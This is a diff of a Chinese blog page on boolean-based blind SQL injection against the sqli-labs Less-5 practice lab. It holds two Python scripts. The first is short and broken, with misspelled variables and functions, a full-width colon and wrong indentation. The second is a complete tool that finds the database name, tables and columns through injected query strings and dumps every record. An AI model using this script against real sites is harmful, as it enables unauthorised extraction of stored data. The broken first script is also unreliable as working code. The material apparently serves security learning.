@@ -178,36 +178,824 @@
 <p>2.获取数据库长度的函数</p>
 <p>3.获取数据库名称的函数</p>
 <p>4.主程序的入口</p>
-<p>&lt;!–code￼0–&gt;
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token keyword">import</span> requests
 
-</p>
+ url<span class="token operator">=</span><span class="token string">"xxxxx"</span>
+ <span class="token keyword">def</span> <span class="token function">get_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payloasd1<span class="token operator">=</span><span class="token string">"?id=1%27%20and%20(length(database()))%20=%20&#123;&#125;%20--      +"</span><span class="token punctuation">.</span>forma<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token comment">#拼接进url进行访问测试，不进行url进行解析的话可能会出现服务器无法解析的情况</span>
+        <span class="token comment">#.format(i)是一个字符串方法，将变量i插入到字符串的指定的位置，这里是将i的值填充到字符串中的占位符&#123;&#125;的位置。</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+        url1<span class="token operator">=</span>url<span class="token operator">+</span>payload1
+        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'you are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库的长度为："</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">return</span> i
+ <span class="token keyword">def</span> <span class="token function">get_databasename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    databasename<span class="token operator">=</span><span class="token string">''</span>
+    <span class="token builtin">len</span><span class="token operator">=</span>get_length<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment">#遍历操作枚举数据库名</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>：
+         <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+               payload2<span class="token operator">=</span><span class="token string">'?id=1%27%20and%20(ascii(substr((select%20database())%20,&#123;&#125;,1)))%20=%20&#123;&#125;%20--        +'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token comment">#将循环的i和j的值插入占位符&#123;&#125;的位置</span>
+                r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload2<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token string">'You are in'</span><span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token comment">#将ascii码转化为字符</span>
+                databasename <span class="token operator">+=</span> char<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"字符为："</span><span class="token punctuation">,</span>char<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库名称为"</span><span class="token punctuation">,</span>databasename<span class="token punctuation">)</span>
+
+
+<span class="token comment">#主程序的入口，当直接运行脚本的时候执行get_databasename()函数（作为模块导入的时候不会自动执行</span>
+ if__name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+        get_databasename<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504272057294.png" alt="image-20250427205700181"></p>
 <p>这只是个简单的获取数据库长度和数据库名的脚本，下面是完整的布尔盲注的脚本。</p>
-<p>&lt;!–code￼1–&gt;
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 
-</p>
+url <span class="token operator">=</span> <span class="token string">"http://sql/sqli-labs/Less-5/"</span>
+
+
+<span class="token keyword">def</span> <span class="token function">db_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始测试数据库名长度"</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and length(database())=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据库长度为：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> i
+    <span class="token keyword">return</span> <span class="token number">0</span>
+
+
+<span class="token keyword">def</span> <span class="token function">db_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data_name <span class="token operator">=</span> <span class="token string">''</span>
+    db_len <span class="token operator">=</span> db_length<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> db_len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and ascii(substr((select database()),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                data_name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"字符为：</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"当前数据库名：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data_name
+
+
+<span class="token keyword">def</span> <span class="token function">tb_piece</span><span class="token punctuation">(</span>db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"开始测试</span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">数据库中有几张表....."</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and (select count(table_name) from information_schema.tables where table_schema='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">')=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">数据库总共有</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">张表"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> i
+    <span class="token keyword">return</span> <span class="token number">0</span>
+
+
+<span class="token keyword">def</span> <span class="token function">tb_name</span><span class="token punctuation">(</span>db_name<span class="token punctuation">,</span> table_count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始猜解表名....."</span><span class="token punctuation">)</span>
+    table_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>table_count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取表长度</span>
+        tb_length <span class="token operator">=</span> <span class="token number">0</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and (select length(table_name) from information_schema.tables where table_schema='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">' limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                tb_length <span class="token operator">=</span> j
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">张表名的长度为：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tb_length<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+
+        <span class="token comment"># 猜解表名</span>
+        current_table <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">if</span> tb_length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tb_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">for</span> char_code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">' limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pos<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_code<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+                    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                    <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                        current_table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char_code<span class="token punctuation">)</span>
+                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"当前表名: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current_table<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                        <span class="token keyword">break</span>
+
+        table_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_table<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"完成第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">张表: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current_table<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">库下的</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_count<span class="token punctuation">&#125;</span></span><span class="token string">张表：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_list<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> table_list
+
+
+<span class="token keyword">def</span> <span class="token function">column_num</span><span class="token punctuation">(</span>table_list<span class="token punctuation">,</span> db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始猜解每张表的字段数....."</span><span class="token punctuation">)</span>
+    column_num_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> table <span class="token keyword">in</span> table_list<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> count <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and (select count(column_name) from information_schema.columns where table_name='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">')=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">表有</span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string">个字段"</span></span><span class="token punctuation">)</span>
+                column_num_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>count<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n各表字段数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_num_list<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> column_num_list
+
+
+<span class="token keyword">def</span> <span class="token function">column_name</span><span class="token punctuation">(</span>table_list<span class="token punctuation">,</span> column_num_list<span class="token punctuation">,</span> db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始猜解每张表的字段名....."</span><span class="token punctuation">)</span>
+    column_name_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> table <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>table_list<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">表的字段："</span></span><span class="token punctuation">)</span>
+        columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> col_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>column_num_list<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            col_name <span class="token operator">=</span> <span class="token string">''</span>
+            <span class="token comment"># 先获取字段长度</span>
+            <span class="token keyword">for</span> length <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and (select length(column_name) from information_schema.columns where table_name='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">' limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>col_num<span class="token punctuation">&#125;</span></span><span class="token string">,1)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                    <span class="token comment"># 猜解字段名</span>
+                    <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        <span class="token keyword">for</span> char_code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">' limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>col_num<span class="token punctuation">&#125;</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pos<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_code<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+                            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                                col_name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char_code<span class="token punctuation">)</span>
+                                <span class="token keyword">break</span>
+                    columns<span class="token punctuation">.</span>append<span class="token punctuation">(</span>col_name<span class="token punctuation">)</span>
+                    <span class="token keyword">print</span><span class="token punctuation">(</span>col_name<span class="token punctuation">)</span>
+                    <span class="token keyword">break</span>
+        column_name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>columns<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> column_name_list
+
+
+<span class="token keyword">def</span> <span class="token function">dump_data</span><span class="token punctuation">(</span>table_list<span class="token punctuation">,</span> column_name_list<span class="token punctuation">,</span> db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"开始导出</span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">库的数据..."</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> table_idx<span class="token punctuation">,</span> table <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>table_list<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">表的数据："</span></span><span class="token punctuation">)</span>
+        columns <span class="token operator">=</span> column_name_list<span class="token punctuation">[</span>table_idx<span class="token punctuation">]</span>
+        <span class="token comment"># 获取记录数</span>
+        <span class="token keyword">for</span> count <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and (select count(*) from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"共有</span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string">条记录"</span></span><span class="token punctuation">)</span>
+                <span class="token comment"># 获取每条记录</span>
+                <span class="token keyword">for</span> record <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    record_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+                    <span class="token keyword">for</span> col <span class="token keyword">in</span> columns<span class="token punctuation">:</span>
+                        <span class="token comment"># 获取字段值长度</span>
+                        <span class="token keyword">for</span> length <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and (select length(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>col<span class="token punctuation">&#125;</span></span><span class="token string">) from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>record<span class="token punctuation">&#125;</span></span><span class="token string">,1)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+                            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                                <span class="token comment"># 猜解字段值</span>
+                                value <span class="token operator">=</span> <span class="token string">''</span>
+                                <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                                    <span class="token keyword">for</span> char_code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                                        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and ascii(substr((select </span><span class="token interpolation"><span class="token punctuation">&#123;</span>col<span class="token punctuation">&#125;</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>db_name<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>record<span class="token punctuation">&#125;</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pos<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_code<span class="token punctuation">&#125;</span></span><span class="token string">--+"</span></span>
+                                        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                                        <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                                            value <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char_code<span class="token punctuation">)</span>
+                                            <span class="token keyword">break</span>
+                                record_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+                                <span class="token keyword">break</span>
+                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>record <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">条: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>record_data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+        db_len <span class="token operator">=</span> db_length<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        current_db <span class="token operator">=</span> db_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        table_count <span class="token operator">=</span> tb_piece<span class="token punctuation">(</span>current_db<span class="token punctuation">)</span>
+        tables <span class="token operator">=</span> tb_name<span class="token punctuation">(</span>current_db<span class="token punctuation">,</span> table_count<span class="token punctuation">)</span>
+        column_counts <span class="token operator">=</span> column_num<span class="token punctuation">(</span>tables<span class="token punctuation">,</span> current_db<span class="token punctuation">)</span>
+        column_names <span class="token operator">=</span> column_name<span class="token punctuation">(</span>tables<span class="token punctuation">,</span> column_counts<span class="token punctuation">,</span> current_db<span class="token punctuation">)</span>
+        dump_data<span class="token punctuation">(</span>tables<span class="token punctuation">,</span> column_names<span class="token punctuation">,</span> current_db<span class="token punctuation">)</span>
